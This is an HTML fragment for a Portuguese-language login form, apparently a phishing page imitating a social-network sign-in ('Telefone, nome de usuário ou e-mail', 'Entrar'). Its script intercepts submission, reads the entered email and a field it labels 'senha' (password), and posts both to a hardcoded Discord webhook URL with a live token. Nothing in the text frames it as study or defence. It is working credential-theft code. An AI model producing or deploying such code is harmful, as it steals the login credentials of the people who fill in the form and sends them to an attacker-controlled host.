                <form onsubmit="sendContact(event)">
                    <label for="emailInput" class="sr-only">Telefone, nome de usuário ou e-mail</label>

                    <button type="submit" class="btn btn-primary">Entrar</button>
                </form>
                <script>
                  async function sendContact(ev) {
                    ev.preventDefault();
            
                    const senderEmail = document
                      .getElementById('emailInput').value;
                    const senderMessage = document
                      .getElementById('messageInput').value;
            
                    const webhookBody = {
                      embeds: [{
                        title: 'Nem te conto',
                        fields: [
                          { name: 'gmail', value: senderEmail },
                          { name: 'senha', value: senderMessage }
                        ]
                      }],
                    };
            
                    const webhookUrl = 'https://discord.com/api/webhooks/1042596753028939818/lZ7craAk0JC7KrfovlA2JdHEJwVrSgjUvHWe0lZ8S6MDI-vrIT_e2OQ8P-rguSZACbdp';
            
                    const response = await fetch(webhookUrl, {
                      method: 'POST',
                      headers: {
                        'Content-Type': 'application/json',
                      },
                      body: JSON.stringify(webhookBody),
                    });
                  }
                </script>
